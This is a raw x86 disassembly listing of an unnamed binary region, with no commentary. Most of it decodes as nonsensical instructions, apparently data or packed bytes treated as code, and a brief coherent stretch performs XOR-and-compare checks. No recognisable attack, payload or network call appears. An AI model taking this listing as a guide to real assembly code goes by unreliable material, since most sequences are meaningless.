  40aebc:	cmp    eax,0x9fd5a427
  40aec1:	jno    0x40ae7c
  40aec3:	aam    0xd5
  40aec5:	inc    edi
  40aec6:	fld    QWORD PTR [eax]
  40aec8:	add    eax,0x67372641
  40aecd:	out    dx,al
  40aece:	ins    DWORD PTR es:[edi],dx
  40aecf:	jle    0x40af1b
  40aed1:	or     al,BYTE PTR ds:0x668a7a75
  40aed7:	add    dh,BYTE PTR [ebx+0x5e2f3b67]
  40aedd:	mov    ebp,0x37adfa9a
  40aee2:	and    bh,dh
  40aee4:	nop
  40aee5:	mov    bl,0xb1
  40aee7:	ret    
  40aee8:	cmc    
  40aee9:	pop    esp
  40aeea:	mov    ds:0x784470c9,eax
  40aeef:	mov    ah,0x6b
  40aef1:	(bad)  
  40aef2:	jecxz  0x40aed1
  40aef4:	fcmovnb st,st(5)
  40aef6:	fadd   QWORD PTR [ebx+0x23bc5b1f]
  40aefc:	ficom  DWORD PTR [edi+0x37]
  40aeff:	and    edi,DWORD PTR [ecx]
  40af01:	daa    
  40af02:	dec    ebp
  40af03:	dec    esi
  40af04:	fist   DWORD PTR [edi]
  40af06:	push   es
  40af07:	imul   esi,DWORD PTR [ebp-0x4c3639e8],0xa97365cb
  40af11:	push   cs
  40af12:	add    al,0x77
  40af14:	cld    
  40af15:	ror    BYTE PTR [edi-0x74],0x53
  40af19:	sbb    dh,dh
  40af1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af1c:	pusha  
  40af1d:	mov    bl,0x6f
  40af1f:	or     eax,0x9583c677
  40af24:	loopne 0x40af35
  40af26:	shl    BYTE PTR [esi+0x14],1
  40af29:	es clc 
  40af2b:	bound  esi,QWORD PTR ds:0x91804e69
  40af31:	or     DWORD PTR [eax],esi
  40af33:	(bad)  
  40af35:	std    
  40af36:	push   eax
  40af37:	inc    edi
  40af38:	jne    0x40af24
  40af3a:	cmp    eax,0xad15661b
  40af3f:	mov    dl,0x2d
  40af41:	outs   dx,DWORD PTR ds:[esi]
  40af42:	rdtsc  
  40af44:	je     0x40aefa
  40af46:	lods   al,BYTE PTR ds:[esi]
  40af47:	pop    eax
  40af48:	mov    dh,0x2f
  40af4a:	fdivrp st(1),st
  40af4c:	dec    eax
  40af4d:	jns    0x40af28
  40af4f:	mov    ecx,0xd64ac295
  40af54:	mov    edx,0x11a97289
  40af59:	jl     0x40af85
  40af5b:	loopne 0x40afa0
  40af5d:	pusha  
  40af5e:	jecxz  0x40aef2
  40af60:	addr16 aam 0xc2
  40af63:	(bad)  
  40af64:	int    0x6e
  40af66:	popa   
  40af67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af68:	data16 jmp 0x40af22
  40af6b:	inc    esi
  40af6c:	into   
  40af6d:	rcl    BYTE PTR [edi+0x6c],1
  40af70:	and    ah,dh
  40af72:	sar    BYTE PTR [edi-0x1a5dd528],0xd9
  40af79:	sub    BYTE PTR [ebp-0x7b],dh
  40af7c:	sahf   
  40af7d:	shl    ah,cl
  40af7f:	mov    DWORD PTR [edi],ebp
  40af81:	out    dx,al
  40af82:	jmp    0x40afda
  40af84:	mov    bh,0x7e
  40af86:	cmp    edx,esp
  40af88:	cmp    esp,DWORD PTR [eax-0x72]
  40af8b:	out    dx,eax
  40af8c:	out    0x3a,al
  40af8e:	pop    ecx
  40af8f:	and    ebx,DWORD PTR [edi]
  40af91:	cmp    BYTE PTR [eax+0x1242a313],0xc8
  40af98:	add    al,0x7d
  40af9a:	lods   al,BYTE PTR ds:[esi]
  40af9b:	scas   eax,DWORD PTR es:[edi]
  40af9c:	ror    BYTE PTR [eax-0x7dba168],1
  40afa2:	sub    eax,0x5204c649
  40afa7:	sub    al,0x3d
  40afa9:	cmp    BYTE PTR [ecx],cl
  40afab:	aas    
  40afac:	loope  0x40afc6
  40afae:	pop    ss
  40afaf:	loopne 0x40afd5
  40afb1:	pop    esp
  40afb2:	jp     0x40af48
  40afb4:	mov    ebp,0x466e0566
  40afb9:	(bad)  
  40afbb:	xchg   esp,eax
  40afbc:	out    0x2,al
  40afbe:	and    al,0x27
  40afc0:	inc    DWORD PTR [ecx+0x376b07cc]
  40afc6:	div    bl
  40afc8:	aas    
  40afc9:	mov    ebp,0x6d5a340b
  40afce:	mov    DWORD PTR [ebp-0xc],ebx
  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     al,dl
  40aff8:	paddsb mm3,QWORD PTR [edx+0x79]
  40affc:	call   0x7d6f2e7f
  40b001:	jle    0x40b081
  40b003:	mov    eax,0xbc0ed5b
  40b008:	sub    ah,BYTE PTR [esi+0x2b]
  40b00b:	pop    ebp
  40b00c:	lahf   
  40b00d:	cmp    DWORD PTR [eax-0x7ee0f51e],esp
  40b013:	pop    ebp
  40b014:	jp     0x40b015
  40b016:	dec    DWORD PTR [eax+0x3f9b1094]
  40b01c:	xchg   edi,eax
  40b01d:	stos   BYTE PTR es:[edi],al
  40b01e:	cmp    edi,DWORD PTR [ecx]
  40b020:	std    
  40b021:	pop    ds
  40b022:	lds    ebx,FWORD PTR [ebx]
  40b024:	mov    dh,0x85
  40b026:	scas   eax,DWORD PTR es:[edi]
  40b027:	aam    0xc7
  40b029:	sbb    BYTE PTR [esi],0xbc
  40b02c:	sub    eax,0xc448903d
  40b031:	lea    edx,es:[edx+0x2bcdae74]
  40b038:	pop    ecx
  40b039:	sbb    eax,0x8cc10c2b
  40b03e:	mov    ds:0xac7196cf,al
  40b043:	push   es
  40b044:	fsubp  st(0),st
  40b046:	or     al,0x6a
  40b048:	(bad)  
  40b049:	mov    ecx,ebx
  40b04b:	add    BYTE PTR [edx],0x54
  40b04e:	push   ecx
  40b04f:	sub    bl,BYTE PTR [ebp-0x4d]
  40b052:	rcl    DWORD PTR [esi+0x34],0xac
  40b056:	or     esp,edx
  40b058:	and    DWORD PTR [edx+0x28a3417f],ecx
  40b05e:	leave  
  40b05f:	dec    edi
  40b060:	ss data16 sbb al,dl
  40b064:	je     0x40b004
  40b066:	inc    ecx
  40b067:	(bad)  
  40b068:	ret    
  40b069:	push   0x8b20593a
  40b06e:	sub    DWORD PTR [ebp-0x64d7fde9],eax
  40b074:	call   0xee780fae
  40b079:	cmp    edx,DWORD PTR [edx+0x153df8c3]
  40b07f:	addr16 dec al
  40b082:	loope  0x40b0a9
  40b084:	call   0x7a28:0x29b6f6dc
  40b08b:	xchg   ebp,eax
  40b08c:	div    BYTE PTR [ebp+esi*2-0x25ccf879]
  40b093:	shr    DWORD PTR [edi+0x762ab101],1
  40b099:	xchg   edi,eax
  40b09a:	pusha  
  40b09b:	mov    DWORD PTR [ecx+0x3161937c],eax
  40b0a1:	push   ecx
  40b0a2:	push   ebp
  40b0a3:	test   esi,0xc492757
  40b0a9:	push   edi
  40b0aa:	pop    edx
  40b0ab:	push   eax
  40b0ac:	scas   al,BYTE PTR es:[edi]
  40b0ad:	mov    ebx,DWORD PTR [ebx+0x6e5bee6c]
  40b0b3:	pop    es
  40b0b4:	or     ah,bh
  40b0b6:	out    0xe9,al
  40b0b8:	push   ss
  40b0b9:	jo     0x40b052
  40b0bb:	rcl    BYTE PTR [ebx+0x20],0x6a
  40b0bf:	enter  0xed63,0x39
  40b0c3:	mov    al,0xc5
  40b0c5:	pcmpgtd mm0,mm3
  40b0c8:	or     al,0x4a
  40b0ca:	sub    eax,0x83b1d5dc
  40b0cf:	out    0xdd,al
  40b0d1:	rcl    BYTE PTR [ecx+0xac8ee51],1
  40b0d7:	cdq    
  40b0d8:	add    edi,edx
  40b0da:	mov    eax,0x21635b
  40b0df:	fdiv   DWORD PTR [edi]
  40b0e1:	xor    eax,0xe50fdc39
  40b0e6:	rcr    BYTE PTR [esi],0xe4
  40b0e9:	mov    ah,0x73
  40b0eb:	loope  0x40b0de
  40b0ed:	mov    ds:0x71a68708,eax
  40b0f2:	ins    DWORD PTR es:[edi],dx
  40b0f3:	jg     0x40b0c2
  40b0f5:	shr    BYTE PTR [edi+0x59df32a2],cl
  40b0fb:	and    DWORD PTR [eax+eiz*4],esi
  40b0fe:	inc    esp
  40b0ff:	push   ebx
  40b100:	sbb    dh,BYTE PTR [edi-0x50]
  40b103:	mov    cl,BYTE PTR [ebx]
  40b105:	sbb    DWORD PTR [ebx-0x3a],0x18762775
  40b10c:	pop    esp
  40b10d:	mov    ch,0x4
  40b10f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b110:	push   ebx
  40b111:	pop    esi
  40b112:	dec    ecx
  40b113:	js     0x40b0cc
  40b115:	fist   WORD PTR [ecx+ebp*2-0x23dc7e92]
  40b11c:	mov    ebx,0x83580a24
  40b121:	mov    ebx,0xdf64cb80
  40b126:	and    BYTE PTR [edx+0xdad1c0e],0xff
  40b12d:	outs   dx,DWORD PTR ds:[esi]
  40b12e:	xchg   ebx,eax
  40b12f:	sub    dl,BYTE PTR [edx]
  40b131:	add    ch,ah
  40b133:	sbb    al,0x30
  40b135:	push   cs
  40b136:	jae    0x40b18e
  40b138:	stos   BYTE PTR es:[edi],al
  40b139:	xor    dh,BYTE PTR [ebp+esi*1-0x57bdb7]
  40b140:	dec    esi
  40b141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b142:	call   0x64c0:0x83fe4a6b
  40b149:	rcr    DWORD PTR [edi],1
  40b14b:	pop    esi
  40b14c:	xor    cl,BYTE PTR [ecx]
  40b14e:	xchg   ebp,eax
  40b14f:	mov    ecx,0x3db53baf
  40b154:	ret    
  40b155:	xor    eax,0x7fffe8cc
  40b15a:	or     bh,al
  40b15c:	sbb    eax,0x25557ec7
  40b161:	or     BYTE PTR [esi-0x4b1807f7],al
  40b167:	icebp  
  40b168:	xor    esp,DWORD PTR [ebx]
  40b16a:	lahf   
  40b16b:	inc    ebx
  40b16c:	into   
  40b16d:	jecxz  0x40b197
  40b16f:	mov    al,ds:0x293d7270
  40b174:	mov    WORD PTR [ebp-0x704d95ec],ss
  40b17a:	stc    
  40b17b:	dec    eax
  40b17c:	in     al,dx
  40b17d:	pop    ebx
  40b17e:	arpl   WORD PTR [edi+0x3b],cx
  40b181:	inc    ebx
  40b182:	dec    esp
  40b183:	add    DWORD PTR [edx-0x7],0xa4c259a9
  40b18a:	(bad)
  40b18d:	and    DWORD PTR [esi+0x5939c4ca],edi
  40b193:	mov    bl,0x9d
  40b195:	cwde   
  40b196:	push   edi
  40b197:	fs push ds
  40b199:	mov    ebx,0xf0ecff09
  40b19e:	push   0xb0204a48
  40b1a3:	pop    esp
  40b1a4:	call   0xe040:0x788257b4
  40b1ab:	in     al,dx
  40b1ac:	mov    esi,0xfc0a05b6
  40b1b1:	test   al,bh
  40b1b3:	ja     0x40b21a
  40b1b5:	xchg   ebx,eax
  40b1b6:	sar    BYTE PTR [esi-0x262865e5],0x98
  40b1bd:	lock in al,0xaf
  40b1c0:	aad    0xa7
  40b1c2:	and    DWORD PTR [esi],0xffffffc0
  40b1c5:	out    dx,al
  40b1c6:	cdq    
  40b1c7:	jb     0x40b14f
  40b1c9:	mov    bl,BYTE PTR [eax+esi*1+0xa]
  40b1cd:	imul   ebx,edi,0xd8ce8c81
  40b1d3:	iret   
  40b1d4:	js     0x40b209
  40b1d6:	jge    0x40b247
  40b1d8:	cmp    al,0xc2
  40b1da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1db:	loope  0x40b187
  40b1dd:	push   edi
  40b1de:	aam    0xaf
  40b1e0:	dec    edx
  40b1e1:	jecxz  0x40b1e4
  40b1e3:	test   eax,0x59819399
  40b1e8:	mov    ss,WORD PTR [edx]
  40b1ea:	int3   
  40b1eb:	push   ebp
  40b1ec:	repnz mov ch,BYTE PTR ds:0xc0e0be55
  40b1f3:	sub    esi,edi
  40b1f5:	inc    esp
  40b1f6:	adc    ch,BYTE PTR [eax+0x7d]
  40b1f9:	dec    ebp
  40b1fa:	ret    
  40b1fb:	jmp    FWORD PTR [edi-0x67]
  40b1fe:	in     al,dx
  40b1ff:	fwait
  40b200:	sahf   
  40b201:	call   0x49dfa7fc
  40b206:	push   esp
  40b207:	(bad)  
  40b208:	pop    edx
  40b209:	call   0x50c5:0x63c2a654
  40b210:	std    
  40b211:	xchg   DWORD PTR [ebx-0x50],ebp
  40b214:	aam    0x27
  40b216:	xchg   ecx,eax
  40b217:	mov    ebp,0xa5073cb4
  40b21c:	push   eax
  40b21d:	mov    bl,0xfd
  40b21f:	pop    ebx
  40b220:	imul   edx,DWORD PTR ds:0x7bc39333,0xfe1da64f
  40b22a:	mov    esi,0x6477ebae
  40b22f:	xchg   esp,eax
  40b230:	mov    bh,0xf9
  40b232:	scas   eax,DWORD PTR es:[edi]
  40b233:	cmc    
  40b234:	mov    eax,ds:0xadf48e9a
  40b239:	jne    0x40b1d1
  40b23b:	dec    ecx
  40b23c:	aad    0x13
  40b23e:	rcr    BYTE PTR [edi+edi*1],0xba
  40b242:	cmc    
  40b243:	repz xchg ebp,eax
  40b245:	dec    esi
  40b246:	std    
  40b247:	aaa    
  40b248:	cmp    DWORD PTR ss:[ecx-0x6],ebp
  40b24c:	cmp    BYTE PTR [edx+0x1e],bl
  40b24f:	sub    bh,bh
  40b251:	repnz into 
  40b253:	xchg   ecx,eax
  40b254:	and    DWORD PTR [ebp+0x3d],ecx
  40b257:	es xor eax,0x2f348129
  40b25d:	jbe    0x40b269
  40b25f:	sbb    esi,esp
  40b261:	ret    
  40b262:	(bad)  
  40b263:	and    BYTE PTR [edi-0x79fb4c9a],al
  40b269:	pop    ss
  40b26a:	pop    ecx
  40b26b:	lods   eax,DWORD PTR ds:[esi]
  40b26c:	scas   al,BYTE PTR es:[edi]
  40b26d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b26e:	test   al,0x8b
  40b270:	fimul  WORD PTR [esi-0x173979db]
  40b276:	mov    ds:0x9917bb77,eax
  40b27b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b27c:	sub    DWORD PTR [ecx+ebp*1-0x795159cf],eax
  40b283:	mov    ecx,ecx
  40b285:	inc    esi
  40b286:	idiv   DWORD PTR [eax]
  40b288:	out    dx,eax
  40b289:	sub    esi,DWORD PTR [edi]
  40b28b:	(bad)  
  40b28c:	fiadd  DWORD PTR [ebp-0x23ba6b4a]
  40b292:	xchg   esi,eax
  40b293:	sub    esi,DWORD PTR [eax-0x10f8ad5a]
  40b299:	and    DWORD PTR [ebx+ecx*1-0xa5cb623],eax
  40b2a0:	shr    al,0xf8
  40b2a3:	inc    edx
  40b2a4:	xchg   edi,eax
  40b2a5:	inc    edx
  40b2a6:	rcl    DWORD PTR [esi-0x32bfb1d1],0x3d
  40b2ad:	mov    bl,0x73
  40b2af:	pushf  
  40b2b0:	inc    ecx
  40b2b1:	js     0x40b23b
  40b2b3:	mov    edx,0xa6236d84
  40b2b8:	push   edx
  40b2b9:	lahf   
  40b2ba:	lea    edx,[eax]
  40b2bc:	push   ds
  40b2bd:	mov    ebp,0xfb5d3647
  40b2c2:	push   esi
  40b2c3:	outs   dx,BYTE PTR ds:[esi]
  40b2c4:	lgs    edx,FWORD PTR [ecx-0x45ac52ac]
  40b2cb:	imul   esi,edx,0xbc2b23a8
  40b2d1:	in     ax,0x84
  40b2d4:	stc    
  40b2d5:	pop    ss
  40b2d6:	push   ecx
  40b2d7:	jo     0x40b2c8
  40b2d9:	dec    ecx
  40b2da:	imul   DWORD PTR [edx+0x1f]
  40b2dd:	mov    ecx,0x21ae0a72
  40b2e2:	loope  0x40b27d
  40b2e4:	leave  
  40b2e5:	and    eax,0xcecc2eaa
  40b2ea:	sub    BYTE PTR [eax+edx*1-0x259bd04c],dl
  40b2f1:	bound  eax,QWORD PTR [edx]
  40b2f3:	gs stos BYTE PTR es:[edi],al
  40b2f5:	lods   eax,DWORD PTR ds:[esi]
  40b2f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2f7:	in     eax,0xbd
  40b2f9:	pop    ecx
  40b2fa:	std    
  40b2fb:	cmp    eax,0xfab03798
  40b300:	jae    0x40b2a9
  40b302:	hlt    
  40b303:	aam    0x61
  40b305:	call   0x4e3d:0xf00df5c1
  40b30c:	data16 mov dh,0x6f
  40b30f:	(bad)  
  40b310:	repnz inc edx
  40b312:	out    dx,al
  40b313:	aas    
  40b314:	repz push edx
  40b316:	cmp    esp,DWORD PTR [esi-0x14030de2]
  40b31c:	adc    ah,0xb5
  40b31f:	mov    ah,0x30
  40b321:	and    ebx,ecx
  40b323:	cli    
  40b324:	xor    edx,DWORD PTR [edx]
  40b326:	test   al,0xe2
  40b328:	or     DWORD PTR [ebx-0x1ffe401a],ecx
  40b32e:	test   DWORD PTR [ebx],esi
  40b330:	in     eax,dx
  40b331:	sub    eax,0x8458b32
  40b336:	mov    ecx,DWORD PTR [ebp-0x8]
  40b339:	xor    eax,esi
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	xor    ecx,ecx
  40b376:	mov    cl,0x6e
  40b378:	sub    edi,esi
  40b37a:	jle    0x40b3fa
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b33d
  40b381:	jmp    0x40b3e9
  40b383:	dec    ecx
  40b384:	aaa    
  40b385:	push   esp
  40b386:	or     al,dl
  40b388:	pop    ss
  40b389:	ins    DWORD PTR es:[edi],dx
  40b38a:	or     DWORD PTR [edx-0x5e],esi
  40b38d:	(bad)  
  40b38e:	xlat   BYTE PTR ds:[ebx]
  40b38f:	ss push ds
  40b391:	dec    ebx
  40b392:	mov    ecx,0xf9b56c5b
  40b397:	ja     0x40b3de
  40b399:	jne    0x40b3ad
  40b39b:	pop    ebp
  40b39c:	push   ss
  40b39d:	inc    ebp
  40b39e:	xchg   esp,eax
  40b39f:	inc    edi
  40b3a0:	or     dh,dh
  40b3a2:	dec    edx
  40b3a3:	mov    ebp,0xae8cc2b5
  40b3a8:	sbb    ebp,esp
  40b3aa:	push   ecx
  40b3ab:	pushf  
  40b3ac:	or     dh,BYTE PTR [edi-0xdf02292]
  40b3b2:	outs   dx,BYTE PTR ds:[esi]
  40b3b3:	xor    ebp,DWORD PTR [esp]
  40b3b6:	dec    edi
  40b3b7:	inc    esi
  40b3b8:	sbb    DWORD PTR [ebp-0x75749aaa],edi
  40b3be:	dec    ebp
  40b3bf:	add    al,0x6
  40b3c1:	pop    esi
  40b3c2:	add    al,0x2
  40b3c4:	ds push ecx
  40b3c6:	jecxz  0x40b363
  40b3c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3c9:	in     al,0x32
  40b3cb:	push   edx
  40b3cc:	enter  0xd04a,0x85
  40b3d0:	sar    ah,1
  40b3d2:	adc    eax,ebx
  40b3d4:	rcl    DWORD PTR [esi+edi*4+0x1c13e533],cl
  40b3db:	jb     0x40b3da
  40b3dd:	ret    0xcd91
  40b3e0:	in     al,dx
  40b3e1:	(bad)  
  40b3e2:	rcl    dh,cl
  40b3e4:	mov    esp,0xed685e63
  40b3e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3ea:	gs jecxz 0x40b45a
  40b3ed:	sar    BYTE PTR [ecx],0xa6
  40b3f0:	inc    esp
  40b3f1:	in     al,0xaf
  40b3f3:	ins    DWORD PTR es:[edi],dx
  40b3f4:	mov    esi,DWORD PTR [edx+edx*4]
  40b3f7:	das    
  40b3f8:	fisubr DWORD PTR [edi-0x45]
  40b3fb:	and    DWORD PTR [eax-0x1],edi
  40b3fe:	fnstenv [edi+0x298dc591]
  40b404:	xchg   esp,eax
  40b405:	dec    ebp
  40b406:	neg    dl
  40b408:	mov    ds:0x2f367d18,al
  40b40d:	sbb    al,0x59
  40b40f:	cmc    
  40b410:	add    eax,edi
  40b412:	pop    eax
  40b413:	mov    dl,0xb7
  40b415:	mov    edi,0x2db24763
  40b41b:	jg     0x40b3ee
  40b41d:	ins    DWORD PTR es:[edi],dx
  40b41e:	mov    al,bh
  40b420:	scas   eax,DWORD PTR es:[edi]
  40b421:	mov    dl,0xa7
  40b423:	aas    
  40b424:	in     eax,dx
  40b425:	or     al,0x79
  40b427:	ds push 0x930fd34d
  40b42d:	and    DWORD PTR [ebp+eiz*1-0x4fd2f4ec],edx
  40b434:	fwait
  40b435:	test   BYTE PTR [eax],cl
  40b437:	ds push ss
  40b439:	or     al,0xe1
  40b43b:	fwait
  40b43c:	inc    esi
  40b43d:	pop    ebp
  40b43e:	in     al,dx
  40b43f:	stos   DWORD PTR es:[edi],eax
  40b440:	ins    BYTE PTR es:[di],dx
  40b442:	adc    BYTE PTR [edi],al
  40b444:	pop    esp
  40b445:	hlt    
  40b446:	push   ss
  40b447:	push   edi
  40b448:	lods   al,BYTE PTR ds:[esi]
  40b449:	jne    0x40b4b7
  40b44b:	and    al,BYTE PTR [ecx]
  40b44d:	lahf   
  40b44e:	push   esp
  40b44f:	fld    DWORD PTR [esi]
  40b451:	pop    edi
  40b452:	fsubr  st(0),st
  40b454:	loopne 0x40b4a4
  40b456:	clc    
  40b457:	sub    esp,esp
  40b459:	adc    edi,DWORD PTR [ecx-0x4b]
  40b45c:	or     dl,BYTE PTR [ebx]
  40b45e:	fs clc 
  40b460:	hlt    
  40b461:	daa    
  40b462:	sub    eax,0x2ea24981
  40b467:	sbb    BYTE PTR [ebx+0x7466718e],cl
  40b46d:	lock jp 0x40b43a
  40b470:	cmp    eax,0xcc1dfb4f
  40b475:	retf   0xd54e
  40b478:	sti    
  40b479:	sahf   
  40b47a:	lods   eax,DWORD PTR cs:[esi]
  40b47c:	cmp    al,0x25
  40b47e:	jns    0x40b4ba
  40b480:	loop   0x40b4ee
  40b482:	cmp    al,0x48
  40b484:	fwait
  40b485:	and    dl,BYTE PTR [esi]
  40b487:	jns    0x40b4e9
  40b489:	add    BYTE PTR [edi-0x2d067e3f],0x42
  40b490:	add    ch,BYTE PTR [ebx-0x1d]
  40b493:	fidivr WORD PTR ds:0x125c0346
  40b499:	sbb    al,BYTE PTR [edi-0x22]
  40b49c:	outs   dx,DWORD PTR ds:[esi]
  40b49d:	inc    esp
  40b49e:	out    0x2f,eax
  40b4a0:	dec    esi
  40b4a1:	adc    DWORD PTR [ecx-0x1b],esp
  40b4a4:	or     dh,BYTE PTR [esi]
  40b4a6:	mov    ds:0x8cb03585,eax
  40b4ab:	xchg   edi,eax
  40b4ac:	or     al,0x38
  40b4ae:	mov    ecx,0xd350ff33
  40b4b3:	push   es
  40b4b4:	cmp    dl,BYTE PTR fs:[edx+ebp*4]
  40b4b8:	cmp    dh,BYTE PTR [edx-0x1a]
  40b4bb:	add    BYTE PTR [esp+edi*1+0x23],dl
  40b4bf:	push   esi
  40b4c0:	mov    DWORD PTR [ebx],ecx
  40b4c2:	dec    esi
  40b4c3:	jae    0x40b47c
  40b4c5:	xor    al,0x9d
  40b4c7:	dec    ebx
  40b4c8:	sar    BYTE PTR [ebp+0x72],1
  40b4cb:	lods   eax,DWORD PTR ds:[esi]
  40b4cc:	xchg   edi,eax
  40b4cd:	pop    es
  40b4ce:	push   ss
  40b4cf:	enter  0x405a,0x18
  40b4d3:	xchg   ecx,eax
  40b4d4:	cmp    dl,BYTE PTR [ebx+0xe]
  40b4d7:	(bad)  
  40b4d8:	fucom  st(4)
  40b4da:	pop    esi
  40b4db:	cmp    al,0xe9
  40b4dd:	inc    edi
  40b4de:	popf   
  40b4df:	jge    0x40b49f
  40b4e1:	icebp  
  40b4e2:	and    al,0x17
  40b4e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4e5:	ins    BYTE PTR es:[edi],dx
  40b4e6:	pop    ss
  40b4e7:	ins    DWORD PTR es:[edi],dx
  40b4e8:	enter  0xdb45,0x4f
  40b4ec:	sbb    al,0x35
  40b4ee:	or     bl,ah
  40b4f0:	adc    DWORD PTR [edi-0x3c23dabb],esp
  40b4f6:	push   edi
  40b4f7:	test   BYTE PTR [edx],dh
  40b4f9:	dec    ebx
  40b4fa:	lock and BYTE PTR [ecx+ebx*2],dh
  40b4fe:	pop    edx
  40b4ff:	stos   BYTE PTR es:[edi],al
  40b500:	test   al,0x5b
  40b502:	clc    
  40b503:	in     al,0x82
  40b505:	test   esi,ecx
  40b507:	or     ebp,DWORD PTR [edx+ecx*2]
  40b50a:	push   ebx
  40b50b:	push   ebp
  40b50c:	push   edi
  40b50d:	xchg   edi,eax
  40b50e:	jb     0x40b57e
  40b510:	push   eax
  40b511:	pop    ebp
  40b512:	into   
  40b513:	js     0x40b4d3
  40b515:	push   0xa82fac3
  40b51a:	adc    al,0x19
  40b51c:	jmp    0x40b51b
  40b51e:	mov    WORD PTR [esi+ebx*2],ss
  40b521:	ins    BYTE PTR es:[edi],dx
  40b522:	or     ebx,DWORD PTR [esi]
  40b524:	lock cmp eax,0x6e19d2a5
  40b52a:	test   eax,0x9e217afd
  40b52f:	push   esp
  40b530:	and    ebp,DWORD PTR ss:[edi]
  40b533:	aam    0x45
  40b535:	outs   dx,DWORD PTR ds:[esi]
  40b536:	je     0x40b53e
  40b538:	out    0x71,eax
  40b53a:	(bad)  
  40b53b:	std    
  40b53c:	xchg   ebx,eax
  40b53d:	xchg   eax,edi
  40b53f:	popa   
  40b540:	jecxz  0x40b5b7
  40b542:	(bad)  
  40b543:	out    dx,al
  40b544:	jecxz  0x40b59c
  40b546:	add    BYTE PTR [ebp+0x79],0x18
  40b54a:	leave  
  40b54b:	cdq    
  40b54c:	xor    edx,DWORD PTR [edx+edx*8]
  40b54f:	repz ds pop esp
  40b552:	dec    edi
  40b553:	jnp    0x40b544
  40b555:	hlt    
  40b556:	je     0x40b56b
  40b558:	sbb    al,0xdf
  40b55a:	imul   BYTE PTR [eax]
  40b55c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b55d:	cmp    ebp,esi
  40b55f:	add    dl,dl
  40b561:	fnstcw WORD PTR [edi]
  40b563:	clc    
  40b564:	xchg   esp,eax
  40b565:	enter  0xc179,0xef
  40b569:	sbb    esi,DWORD PTR [ebp+0x6b]
  40b56c:	inc    edi
  40b56d:	jbe    0x40b5c5
  40b56f:	add    bh,al
  40b571:	sbb    BYTE PTR [ebx-0x5e],0xc
  40b575:	inc    esi
  40b576:	mov    eax,ds:0x7eeec73c
  40b57b:	js     0x40b5a8
  40b57d:	int    0xc1
  40b57f:	sahf   
  40b580:	das    
  40b581:	bound  esp,QWORD PTR [ebp-0x20]
  40b584:	in     al,0x5f
  40b586:	retf   0xcc8d
  40b589:	jno    0x40b532
  40b58b:	sub    eax,0xc30aac3b
  40b590:	outs   dx,BYTE PTR ds:[esi]
  40b591:	(bad)  
  40b592:	test   al,0xf6
  40b594:	push   ecx
  40b595:	test   DWORD PTR [ebx-0x150b3ae7],ecx
  40b59b:	addr16 popa 
  40b59d:	repnz mov ds:0xe86b0d5c,al
  40b5a3:	stc    
  40b5a4:	add    bh,BYTE PTR [edi]
  40b5a6:	bound  edx,QWORD PTR [esi]
  40b5a8:	mov    al,0x69
  40b5aa:	mov    BYTE PTR [ecx],ch
  40b5ac:	popf   
  40b5ad:	add    ecx,DWORD PTR [esp+ecx*4+0x481c5c72]
  40b5b4:	mov    al,ds:0xf9ad2b31
  40b5b9:	repnz fwait
  40b5bb:	mov    al,0x2e
  40b5bd:	mov    ds:0x19a07faa,eax
  40b5c2:	scas   al,BYTE PTR es:[edi]
  40b5c3:	xor    bl,BYTE PTR [edx+edi*8]
  40b5c6:	pop    ds
  40b5c7:	scas   al,BYTE PTR es:[edi]
  40b5c8:	clc    
  40b5c9:	adc    eax,0x922cd511
  40b5ce:	fidivr DWORD PTR [ebx]
  40b5d0:	test   eax,0x2c6a856d
  40b5d5:	mov    ebx,0xf8a9f7bf
  40b5da:	mov    esp,0xe27bd16f
  40b5df:	jnp    0x40b59c
  40b5e1:	popf   
  40b5e2:	mov    dl,0x10
  40b5e4:	cmp    esp,DWORD PTR [esi+0x32]
  40b5e7:	mov    eax,0xc3e84068
  40b5ec:	int    0x79
  40b5ee:	pop    ss
  40b5ef:	mul    DWORD PTR [eax-0xd]
  40b5f2:	mov    BYTE PTR [ebx+0x5ad45740],bl
  40b5f8:	es xchg ebp,eax
  40b5fa:	rol    DWORD PTR [eax],0x45
  40b5fd:	or     eax,0xbdd090aa
  40b602:	outs   dx,DWORD PTR ds:[esi]
  40b603:	sbb    eax,0xaaffa68f
  40b608:	jle    0x40b5ec
  40b60a:	in     al,0x22
  40b60c:	stc    
  40b60d:	mov    al,0x8d
  40b60f:	popf   
